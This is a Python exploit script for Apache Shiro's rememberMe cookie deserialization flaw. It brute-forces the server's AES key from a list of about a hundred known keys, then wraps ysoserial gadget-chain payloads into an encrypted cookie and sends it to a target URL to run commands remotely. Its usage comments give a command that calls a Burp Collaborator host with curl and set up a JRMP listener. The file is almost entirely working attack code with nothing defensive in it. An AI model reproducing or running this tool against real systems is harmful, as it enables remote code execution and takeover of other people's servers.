import sys,time
import base64
import uuid
import requests
import subprocess
from Crypto.Cipher import AES

#check: python3 shiro.py URLDNS "http://xxxx.ceye.io"

#exploit:
#python3 shiro.py CommonsCollections6 "curl xxx.burpcollaborator.net" http://127.0.0.1:9080/

#java -cp ysoserial.jar ysoserial.exploit.JRMPListener 19999 CommonsCollections6 "curl xxx"
#python3 shiro.py JRMPClient "ip:19999"

shiro_key="kPH+bIxk5D2deZiIxcaaaA=="

keys = ['WkhBTkdYSUFPSEVJX0NBVA==','RVZBTk5JR0hUTFlfV0FPVQ==','U3ByaW5nQmxhZGUAAAAAAA==', 'sHdIjUN6tzhl8xZMG3ULCQ==', 'cGljYXMAAAAAAAAAAAAAAA==', 'd2ViUmVtZW1iZXJNZUtleQ==', 'fsHspZw/92PrS3XrPW+vxw==', 
'ertVhmFLUs0KTA3Kprsdag==', '2itfW92XazYRi5ltW0M2yA==', '6ZmI6I2j3Y+R1aSn5BOlAA==', 'f/SY5TIve5WWzT4aQlABJA==', 'Jt3C93kMR9D5e8QzwfsiMw==', 
'aU1pcmFjbGVpTWlyYWNsZQ==', 'XTx6CKLo/SdSgub+OPHSrw==', '8AvVhmFLUs0KTA3Kprsdag==', '66v1O8keKNV3TTcGPK1wzg==', 'Q01TX0JGTFlLRVlfMjAxOQ==', 
'5AvVhmFLUS0ATA4Kprsdag==', 'ZmFsYWRvLnh5ei5zaGlybw==', '0AvVhmFLUs0KTA3Kprsdag==', 'r0e3c16IdVkouZgk1TKVMg==', 'Z3VucwAAAAAAAAAAAAAAAA==', 
'5J7bIJIV0LQSN3c9LPitBQ==', 'ZnJlc2h6Y24xMjM0NTY3OA==', 'yeAAo1E8BOeAYfBlm4NG9Q==', 'a3dvbmcAAAAAAAAAAAAAAA==', '4BvVhmFLUs0KTA3Kprsdag==', 
's0KTA3mFLUprK4AvVhsdag==', 'yNeUgSzL/CfiWw1GALg6Ag==', 'OY//C4rhfwNxCQAQCrQQ1Q==', 'fCq+/xW488hMTCD+cmJ3aQ==', 'ZAvph3dsQs0FSL3SDFAdag==', 
'MTIzNDU2NzgxMjM0NTY3OA==', '1AvVhdsgUs0FSA3SDFAdag==', 'Bf7MfkNR0axGGptozrebag==', '1QWLxg+NYmxraMoxAXu/Iw==', '6AvVhmFLUs0KTA3Kprsdag==', 
'6NfXkC7YVCV5DASIrEm1Rg==', '2AvVhdsgUs0FSA3SDFAdag==', '9FvVhtFLUs0KnA3Kprsdyg==', 'OUHYQzxQ/W9e/UjiAGu6rg==', 'ClLk69oNcA3m+s0jIMIkpg==', 
'vXP33AonIp9bFwGl7aT7rA==', 'NGk/3cQ6F5/UNPRh8LpMIg==', 'MPdCMZ9urzEA50JDlDYYDg==', 'c2hpcm9fYmF0aXMzMgAAAA==', 'XgGkgqGqYrix9lI6vxcrRw==', 
'2A2V+RFLUs+eTA3Kpr+dag==', '5AvVhmFLUs0KTA3Kprsdag==', '3AvVhmFLUs0KTA3Kprsdag==', 'WcfHGU25gNnTxTlmJMeSpw==', 'bWljcm9zAAAAAAAAAAAAAA==', 
'bWluZS1hc3NldC1rZXk6QQ==', 'bXRvbnMAAAAAAAAAAAAAAA==', '6ZmI6I2j5Y+R5aSn5ZOlAA==', '3JvYhmBLUs0ETA5Kprsdag==', 'A7UzJgh1+EWj5oBFi+mSgw==', 
'Is9zJ3pzNh2cgTHB4ua3+Q==', '25BsmdYwjnfcWmnhAciDDg==', 'cmVtZW1iZXJNZQAAAAAAAA==', '7AvVhmFLUs0KTA3Kprsdag==', '3qDVdLawoIr1xFd6ietnwg==', 
'Y1JxNSPXVwMkyvES/kJGeQ==', 'xVmmoltfpb8tTceuT5R7Bw==', 'O4pdf+7e+mZe8NyxMTPJmQ==', 'SDKOLKn2J1j/2BHjeZwAoQ==', 'a2VlcE9uR29pbmdBbmRGaQ==', 
'V2hhdCBUaGUgSGVsbAAAAA==', 'GAevYnznvgNCURavBhCr1w==', 'hBlzKg78ajaZuTE0VLzDDg==', 'kPv59vyqzj00x11LXJZTjJ2UHW48jzHN', 'WuB+y2gcHRnY2Lg9+Aqmqg==', 
'9AvVhmFLUs0KTA3Kprsdag==', 'SkZpbmFsQmxhZGUAAAAAAA==', 'kPH+bIxk5D2deZiIxcaaaA==', 'lT2UvDUmQwewm6mMoiw4Ig==', 'HWrBltGvEZc14h9VpMvZWw==', 
'8BvVhmFLUs0KTA3Kprsdag==', 'bya2HkYo57u6fWh5theAWw==', 'IduElDUpDDXE677ZkhhKnQ==', '1tC/xrDYs8ey+sa3emtiYw==', 'MTIzNDU2Nzg5MGFiY2RlZg==', 
'c+3hFGPjbgzGdrC+MHgoRQ==', 'rPNqM6uKFCyaL10AK51UkQ==', '5aaC5qKm5oqA5pyvAAAAAA==', 'cGhyYWNrY3RmREUhfiMkZA==', 'MzVeSkYyWTI2OFVLZjRzZg==', 
'YI1+nBV//m7ELrIyDHm6DQ==', 'empodDEyMwAAAAAAAAAAAA==', 'NsZXjXVklWPZwOfkvk6kUA==', 'ZUdsaGJuSmxibVI2ZHc9PQ==', 'L7RioUULEFhRyxM7a2R/Yg==', 
'i45FVt72K2kLgvFrJtoZRw==', '4AvVhmFLUs0KTA3Kprsdag==', 'wGiHplamyXlVB11UXWol8g==', '2cVtiE83c4lIrELJwKGJUw==', 'U3BAbW5nQmxhZGUAAAAAAA==',
]

headers={"User-Agent":"Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.110 Safari/537.36 Zxxz/1.0","Connection":"close"}


def encode_rememberme(payload,command):
    global shiro_key
    print ("Command: "+command)
    popen = subprocess.Popen(['java', '-jar', '/Users/aresx/tools/ysoserial.jar', payload,command], stdout=subprocess.PIPE,)
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    #key  =  "kPH+bIxk5D2deZiIxcaaaA=="
    key = shiro_key
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key,), mode, iv)
    file_body = pad(popen.stdout.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def encode(ser):
    global shiro_key
    ser = open(ser,"rb").read()
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key  =  shiro_key
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    encryptor = AES.new(base64.b64decode(key,), mode, iv)
    file_body = pad(ser)
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    return base64_ciphertext

def check_key(url=None,key=None):
    BS   = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    mode =  AES.MODE_CBC
    iv   =  uuid.uuid4().bytes
    #checker="MTIz"
    checker="rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBzcgAXamF2YS51dGlsLkxpbmtlZEhhc2hNYXA0wE5cEGzA+wIAAVoAC2FjY2Vzc09yZGVyeHIAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAADHcIAAAAEAAAAAF0AC5jb20uamVlY21zLmNvcmUuc2VjdXJpdHkuQ21zQXV0aG9yaXppbmdSZWFsbV8wc3IAF2phdmEudXRpbC5MaW5rZWRIYXNoU2V02GzXWpXdKh4CAAB4cgARamF2YS51dGlsLkhhc2hTZXS6RIWVlri3NAMAAHhwdwwAAAAQP0AAAAAAAAF0AAVhZG1pbnh4AHcBAXEAfgAFeA=="
    if key is not None:
        try:
            encryptor = AES.new(base64.b64decode(key), mode, iv)
            file_body=pad(base64.b64decode(checker))
            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body)) 
            cookie={"rememberMe":base64_ciphertext.decode()}
            print (cookie)
            return
        except Exception as e:
            print (e)
            return
    knock=requests.get(url,cookies={"rememberMe":"123"},verify=False)
    if "rememberMe=deleteMe" not in knock.headers['Set-Cookie']:
        print ("May not use Shiro")
        return 
    else:
        print("Target Used Shiro,Staring butre key:")
    shiro_key=""
    for key in keys:
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        file_body=pad(base64.b64decode(checker))
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        cookie={"rememberMe":base64_ciphertext.decode()}
        rsp = requests.get(url,cookies=cookie,headers=headers,allow_redirects=False,verify=False)
        #print (rsp.headers['Set-Cookie'])
        if "rememberMe=deleteMe" not in rsp.headers['Set-Cookie']:
            print ("Key Found: {}".format(key))
            shiro_key=key
            break
        else :
            pass
    if shiro_key == "":
        print ("Key Not Found")

if __name__ == '__main__':

    if sys.argv[1] == "check":
        if sys.argv[2].startswith("http"):
            check_key(sys.argv[2])
        else:
            print (1)
            check_key(key=sys.argv[2])
    elif sys.argv[1] == "encode":
        payload = encode(sys.argv[2])
        if sys.argv[3]:
            url = sys.argv[3]
            requests.get(url,cookies={'rememberMe':payload.decode()})
        else:
            print (payload.decode())
    else:
        payload = encode_rememberme(sys.argv[1],sys.argv[2])
        url = sys.argv[3]
        print(payload.decode())
        rsp=requests.get(url,cookies={'rememberMe':payload.decode()})
        print("Payload Send")
        #print(payload.decode())
        with open("payload.cookie", "w") as fpw:
            print("rememberMe={}".format(payload.decode()), file=fpw)
